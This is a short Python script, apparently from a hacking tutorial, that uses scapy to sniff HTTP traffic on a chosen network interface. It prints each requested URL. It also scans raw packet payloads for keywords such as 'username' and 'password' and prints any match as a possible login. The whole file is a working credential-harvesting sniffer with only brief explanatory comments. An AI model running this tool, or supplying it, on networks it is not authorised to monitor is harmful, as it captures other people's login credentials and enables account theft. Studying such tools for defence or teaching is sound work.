#!/usr/bin/env python
import optparse

__author__ = 'Quest'

try:
    import scapy.all as scapy
except ImportError:
    import scapy

# This import works from the project directory
# import scapy_http.http

# If you installed this package via pip, you just need to execute this
from scapy.layers import http


def get_arguments():
    # Parser Obj/ entity that handles user input
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface",
                      help="Interface to sniff from")

    (options, arguments) = parser.parse_args()

    if not options.interface:
        # code to handle err if no interface
        parser.error("[-] Please specify an interface, "
                     "use --help for more info")
    return options


# https://github.com/invernizzi/scapy-http
# filter http packet

# filter arg to help us filter packets : by protocol / ports
# filter="21":filter="21" || http://biot.com/capstats/bpf.html
# bpf cannot filter http

# sniff function
def sniff(interface):
    # interface our function to sniff from
    # prn specify call back fxn (every time a pckt is captured)
    # scapy not to store anything in memory for us
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + \
           packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print specific load
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login",
                    "password", "pass", "LOGIN"]
        for keyword in keywords:
            if keyword in load:
                return load.decode()


# this fxn can be used to filter pckt, modify, etc
def process_sniffed_packet(packet):
    # print only the packet layer with http data then Raw layer
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " +
                  login_info + "\n\n")


options = get_arguments()
sniff(options.interface)
# options = get_arguments()
# get the interface to sniff from
